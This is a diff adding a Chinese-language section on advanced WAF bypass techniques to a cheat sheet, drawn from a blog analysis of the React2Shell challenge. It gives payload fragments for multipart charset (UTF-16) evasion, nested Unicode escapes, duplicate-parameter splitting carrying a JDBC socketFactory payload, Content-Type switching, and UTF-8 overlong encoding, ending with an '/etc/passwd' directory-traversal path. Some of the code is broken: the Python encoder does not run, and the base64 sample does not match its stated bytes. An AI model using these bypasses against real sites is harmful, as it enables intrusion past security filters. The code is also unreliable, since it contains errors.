@@ -200,3 +200,116 @@
 | Imperva | HPP + JSON nesting | Unknown | Parameter pollution |
 | F5 BIG-IP | Serialized data + learning mode | Configurable | Weak serialization inspection |
 | Sucuri | Origin IP + alt tags | Unknown | WordPress-centric rules |
+
+---
+
+## 9. ADVANCED BYPASS TECHNIQUES (from leavesongs.com)
+
+> 本节补充自 Phith0n 对 React2Shell WAF 绕过挑战的分析 [1]
+
+### 9.1 Content-Type Charset 编码绕过
+
+**原理**: 利用 Multipart 表单中的 `charset` 参数指定非标准编码，WAF 解码失败但后端正确解码。
+
+**UTF-16 绕过示例**:
+```http
+POST / HTTP/1.1
+Content-Type: multipart/form-data; boundary=----WebKitBoundary
+
+------WebKitBoundary
+Content-Disposition: form-data; name="data"; charset=utf-16
+Content-Transfer-Encoding: base64
+
+// UTF-16LE 编码的 payload，base64 编码后
+// 原始: {"constructor": ...}
+// UTF-16LE: \x7b\x00\x22\x00\x63\x00\x6f\x00\x6e\x00...
+// Base64: eyAiAGMAbwBuAHMAdAByAHUAYwB0AG8AcgAiADoAIAAuAC4ALgB9AA==
+------WebKitBoundary--
+```
+
+**适用场景**: 
+- Node.js + busboy 解析器
+- 目标使用 multipart/form-data
+- WAF 未对 charset 参数做严格校验
+
+### 9.2 多重 Unicode 编码绕过
+
+**原理**: 利用递归 JSON 解析机制，多层编码嵌套绕过逐层检测。
+
+React Flight 解析过程中，Chunk 的 value 可以包含子 Chunk，每次解析都是一次 JSON.parse()：
+
+```javascript
+// 外层解析
+{
+  "value": "{\"then\": \"\\u0024B1337\"}"  // value 是编码后的 JSON
+}
+// 解析 value 后得到
+{"then": "\u0024B1337"}  // 包含编码字符
+// 再次解析后得到
+{"then": "$B1337"}  // 最终 payload
+```
+
+**防御建议**: WAF 应实现递归 Unicode 解码，直到无编码字符存在。
+
+### 9.3 分片参数绕过（Parameter Splitting）
+
+**原理**: 利用不同组件对重复参数的处理差异。
+
+**示例（Java Filter + Spring Controller）**:
+```http
+POST /jdbc?url=jdbc:postgresql://1:2/?a=&url=%26socketFactory=org.springframework...
+```
+
+**处理差异**:
+- Filter: `request.getParameter("url")` → 获取第一个 `url` 参数值
+- Spring: 获取所有 `url` 参数，用逗号拼接 → 完整 payload
+
+**其他利用点**:
+- `Content-Type` vs `content-type` (大小写)
+- 数组参数: `param[]` vs `param`
+
+### 9.4 协议切换绕过
+
+**原理**: WAF 规则集通常针对不同 Content-Type 分别编写，切换协议可能绕过特定规则。
+
+**Next.js Server Action 绕过**:
+```http
+// 原本使用 multipart/form-data（被拦截）
+Content-Type: multipart/form-data; boundary=...
+
+// 切换为 form-urlencoded（绕过）
+Content-Type: application/x-www-form-urlencoded
+```
+
+**前提条件**: 目标必须存在至少一个合法的 Server Action（用于提供 Next-Action header）
+
+### 9.5 UTF-8 Overlong Encoding
+
+**原理**: 将单字节字符强制编码为多字节，绕过基于字符匹配的检测。
+
+**编码示例**:
+| 原始字符 | Overlong 编码 (2字节) | Overlong 编码 (3字节) |
+|---------|---------------------|---------------------|
+| `.` | `%C0%AE` | `%E0%80%AE` |
+| `o` | `%C1%AF` | `%E0%81%AF` |
+| `<` | `%C0%BC` | `%E0%80%BC` |
+
+**Java 反序列化利用**:
+```python
+# Python 转换脚本
+def overlong_encode(s: str, bytes_len: int = 2) -> bytes:
+    if bytes_len == 2:
+        return bytes([((c >> 6) & 0b11111) | 0b11000000, 
+                      (c & 0b111111) | 0b10000000] for c in s.encode())
+    # 3字节、4字节同理...
+```
+
+**历史漏洞**: GlassFish 目录穿越 (CVE-2017-1000028)
+```
+/vuln/%C0%AE%C0%AE/etc/passwd  →  ../../etc/passwd
+```
+
+## 参考
+
+[1] Phith0n. "React2Shell攻防笔记：原理挖掘与价值15万美元的WAF绕过思路". leavesongs.com. 2025-12-30.
+    https://www.leavesongs.com/PENETRATION/deep-dive-into-react2shell.html
